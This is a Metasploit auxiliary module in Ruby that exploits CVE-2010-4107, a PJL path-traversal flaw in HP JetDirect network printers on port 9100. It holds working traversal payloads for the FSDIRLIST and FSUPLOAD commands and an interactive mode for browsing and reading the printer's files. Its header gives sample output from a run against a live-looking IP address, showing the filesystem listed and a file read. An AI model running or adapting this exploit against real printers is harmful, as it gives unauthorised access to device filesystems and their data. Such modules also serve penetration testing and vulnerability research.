# Date: Aug 7, 2011
# Author: Myo Soe <YGN Ethical Hacker Group - http://yehg.net/>
# Software Link: http://www.hp.com
# Version: All
# Tested on: HP LaserJet Pxxxx Series
 
##
# $Id: $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
 
##
# Sample Output:
#
#
# msf auxiliary(hp_printer_pjl_traversal) > show options
#
# Module options (auxiliary/admin/hp_printer_pjl_traversal):
#
#    Name         Current Setting  Required  Description
#    ----         ---------------  --------  -----------
#    INTERACTIVE  false            no        Enter interactive mode [msfconsole Only]
#    RHOST        202.138.16.21    yes       The target address
#    RPATH        /                yes       The remote filesystem path to browse or read
#    RPORT        9100             yes       The target port
#
#
# msf auxiliary(hp_printer_pjl_traversal) > run
#
# [*] cd / ...
# [+] Server returned the following response:
#
# . TYPE=DIR
# .. TYPE=DIR
# bin TYPE=DIR
# usr TYPE=DIR
# etc TYPE=DIR
# hpmnt TYPE=DIR
# hp TYPE=DIR
# lib TYPE=DIR
# dev TYPE=DIR
# init TYPE=FILE SIZE=9016
# .profile TYPE=FILE SIZE=834
# tmp TYPE=DIR
#
#
# msf auxiliary(hp_printer_pjl_traversal) > set INTERACTIVE true
# INTERACTIVE => true
# msf auxiliary(hp_printer_pjl_traversal) > set RPATH /hp
# RPATH => /hp
# msf auxiliary(hp_printer_pjl_traversal) > run
#
# [*] Entering interactive mode ...
# [*] cd /hp ...
# [+] Server returned the following response:
#
# . TYPE=DIR
# .. TYPE=DIR
# app TYPE=DIR
# lib TYPE=DIR
# bin TYPE=DIR
# webServer TYPE=DIR
# images TYPE=DIR
# DemoPage TYPE=DIR
# loc TYPE=DIR
# AsianFonts TYPE=DIR
# data TYPE=DIR
# etc TYPE=DIR
# lrt TYPE=DIR
#
# [*] Current RPATH: /hp
# [*] -> &#039;quit&#039; to exit
# [*] ->&#039;/&#039; to return to file system root
# [*] ->&#039;..&#039; to move up to one directory
# [*] ->&#039;!r FILE&#039; to read FILE on current directory
#
# [*] Enter RPATH:
# $ > webServer/config
# [*] cd /hp/webServer/config ...
# [+] Server returned the following response:
#
# . TYPE=DIR
# .. TYPE=DIR
# soe.xml TYPE=FILE SIZE=23615
# version.6 TYPE=FILE SIZE=45
#
#
# [*] Current RPATH: /hp/webServer/config
# [*] -> &#039;quit&#039; to exit
# [*] ->&#039;/&#039; to return to file system root
# [*] ->&#039;..&#039; to move up to one directory
# [*] ->&#039;!r FILE&#039; to read FILE on current directory
#
# [*] Enter RPATH:
# $ > !r version.6
# [*] cat /hp/webServer/config/version.6 ...
# [+] Server returned the following response:
#
# WebServer directory version.  Do not delete!
#
#
# [*] Current RPATH: /hp/webServer/config
# [*] -> &#039;quit&#039; to exit
# [*] ->&#039;/&#039; to return to file system root
# [*] ->&#039;..&#039; to move up to one directory
# [*] ->&#039;!r FILE&#039; to read FILE on current directory
#
# [*] Enter RPATH:
# $ > quit
# [*] Exited ... Have fun with your Printer!
# [*] Auxiliary module execution completed
 
 
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Auxiliary
 
    include Msf::Exploit::Remote::Tcp
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;        => &#039;HP JetDirect PJL Interface Universal Path Traversal&#039;,
            &#039;Version&#039;     => &#039;$Revision: 1 $&#039;,
            &#039;Description&#039;   => %q{
                This module exploits path traveresal issue in possibly all HP network-enabled printer series, especially those which enable Printer Job Language (aka PJL) command interface through the default JetDirect port 9100.
                With the decade-old dot-dot-slash payloads, the entire printer file system can be accessed or modified.
            },
            &#039;Author&#039;      => [
                    &#039;Moritz Jodeit <http://www.nruns.com/>&#039;, # Bug Discoverer
                    &#039;Myo Soe <YGN Ethical Hacker Group, http://yehg.net/>&#039; # Metasploit Module                   
                    ],
            &#039;License&#039;     => MSF_LICENSE,
            &#039;References&#039;     =>
            [
                [ &#039;CVE&#039;, &#039;2010-4107&#039; ],
                [ &#039;URL&#039;, &#039;http://www.nruns.com/_downloads/SA-2010%20003-Hewlett-Packard.pdf&#039; ],            
                [ &#039;URL&#039;, &#039;http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02004333&#039; ],             
                [ &#039;URL&#039;, &#039;http://www.irongeek.com/i.php?page=security/networkprinterhacking&#039; ],
                [ &#039;URL&#039;, &#039;https://github.com/urbanadventurer/WhatWeb/blob/master/plugins/HP-laserjet-printer.rb&#039; ],
                [ &#039;URL&#039;, &#039;https://github.com/urbanadventurer/WhatWeb/blob/master/plugins/HP-OfficeJet-Printer.rb&#039; ],
                [ &#039;URL&#039;, &#039;http://core.yehg.net/lab/#tools.exploits&#039; ]
            ],
            &#039;DisclosureDate&#039; => &#039;2010-11-15&#039;))
         
        register_options(
        [
 
            OptString.new(&#039;RPATH&#039;,
                    [
                        true,
                        "The remote filesystem path to browse or read",
                        "/"
                    ]
                ),
            OptBool.new(&#039;INTERACTIVE&#039;,
                                [
                                    false,
                                    "Enter interactive mode [msfconsole Only]",
                                    false
                                ]
                            ),
                 
            Opt::RPORT(9100)
        ],self.class)
         
 
    end
 
    def run
        mode = datastore[&#039;INTERACTIVE&#039;]
 
        if mode == true
            set_interactive(datastore[&#039;RPATH&#039;])
        else
            set_onetime(datastore[&#039;RPATH&#039;])
        end
    end
     
    def set_interactive(spath)
        action = &#039;DIR&#039;
        rpath =  spath
        rfpath = &#039;&#039;
        tmp_path = &#039;&#039;
        tmp_file = &#039;&#039;
        cur_dir = &#039;/&#039;
         
        print_status("Entering interactive mode")
        stop = false
         
        set_onetime(rpath)
         
        until stop == true     
            print_status("Current RPATH: #{rpath}")
            print_status("-> &#039;quit&#039; to exit")
            print_status("->&#039;/&#039; to return to file system root")
            print_status("->&#039;..&#039; to move up to one directory")
            print_status("->&#039;!r FILE&#039; to read FILE on current directory\r\n")
            print_status("Enter RPATH:")
            print("$ > ")
 
            tmp_path = gets.chomp.to_s 
             
 
            if tmp_path =~ /\.\./ && rpath.length > 2
                old_path = rpath
                new_path = rpath[0,rpath.rindex(&#039;/&#039;)]
                if new_path != nil
                    rpath = new_path
                else
                    rpath = &#039;/&#039;
                end
                rpath = &#039;/&#039; if rpath.length == 0
                print_status("Change to one up directory: #{rpath}")
            elsif tmp_path =~ /\!r\s/  
                cur_dir = rpath
                tmp_file = tmp_path.gsub(&#039;!r &#039;,&#039;&#039;)
                rfpath = cur_dir + &#039;/&#039; + tmp_file
                rfpath = rfpath.gsub(&#039;//&#039;,&#039;/&#039;) 
                action = &#039;FILE&#039;
                 
            elsif tmp_path == &#039;/&#039;
                rpath = &#039;/&#039;
            elsif rpath != &#039;/&#039;
                rpath = rpath + &#039;/&#039; << tmp_path
            else
                rpath = rpath  << tmp_path
            end
            if rpath =~ /quit/
                stop= true
                rpath = &#039;/&#039;
                print_status("Exited ... Have fun with your Printer!")
            else
                rpath = rpath.gsub(&#039;//&#039;,&#039;/&#039;)   
                if action == &#039;FILE&#039;
                    set_onetime(rfpath,action)
                    cur_dir = rpath
                else
                    set_onetime(rpath,action)
                end
                action = &#039;DIR&#039; 
            end
        end
    end
     
    def set_onetime(spath,saction =  datastore[&#039;ACTION&#039;])
         
        rpathx  = spath
        action = saction
        rpathx = &#039;/&#039; if rpathx =~ /\/quit/
 
        connect
         
        dir_cmd = "\x1b%-12345X@PJL FSDIRLIST NAME=\"0:/../../../[REPLACE]\" ENTRY=1 COUNT=99999999\x0d\x0a\x1b%-12345X\x0d\x0a"
        file_cmd = "\x1b%-12345X@PJL FSUPLOAD NAME=\"0:/../../../[REPLACE]\" OFFSET=0 SIZE=99999999\x0d\x0a\x1b%-12345X\x0d\x0a"
         
        if action =~ /DIR/
            r_cmd = dir_cmd.sub("[REPLACE]",rpathx)
            print_status("cd #{rpathx} ...")
        else
            r_cmd = file_cmd.sub("[REPLACE]",rpathx)
            print_status("cat #{rpathx} ...")  
        end
         
         
         
        recv = sock.put(r_cmd)
        res = sock.get(-1,1)
         
        if (!res)
            print_error("ERROR in receiving data!\r\n")
        else
            if res.to_s =~ /ERROR/
                print_error("Operation Not Permitted or File/DIR Not Found!\r\n")
                disconnect
                return
            end
            resx = res.to_s[res.index("\r\n")+1,res.length]
            print_good("Server returned the following response:\r\n#{resx}")
        end
         
        disconnect 
     
    end
 
 
end



